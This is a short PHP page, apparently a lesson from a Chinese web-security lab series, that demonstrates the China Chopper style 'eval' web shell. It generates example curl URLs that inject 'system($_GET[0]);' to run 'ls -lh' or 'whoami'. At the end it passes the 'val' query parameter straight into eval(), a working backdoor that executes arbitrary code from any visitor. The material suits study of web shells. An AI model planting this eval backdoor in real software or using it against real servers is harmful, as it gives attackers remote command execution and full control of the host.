<?php
    error_reporting(E_ALL);
    ini_set("display_errors", 1);
    
	$baseurl = 'http://' . $_SERVER['HTTP_HOST'] . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) . '?val=';
	$linux   = $baseurl . 'system($_GET[0]);&0=ls+-lh';
	$windows = $baseurl . 'system($_GET[0]);&0=whoami';
?>

<html>
<head>	
	<meta charset="UTF-8"/>
	<title>014 - 中国菜刀</title>
</head>
<body>
	<h1>014 - WebShell - 中国菜刀 - eval 方式</h1>

<p>不正常调用: </p>
<p>curl -g '<a href="<?php echo $linux ?>" target="_blank"><?php echo $linux ?></a>'</p>
<br>
<p>windows 不正常调用: </p>
<p>curl -g '<a href="<?php echo $windows ?>" target="_blank"><?php echo $windows ?></a>'</p>

<br>
<p>执行结果</p>

<?php
	if (isset($_GET['val'])) 
	{
		eval($_GET['val']);
	}
?>

</body>
</html>
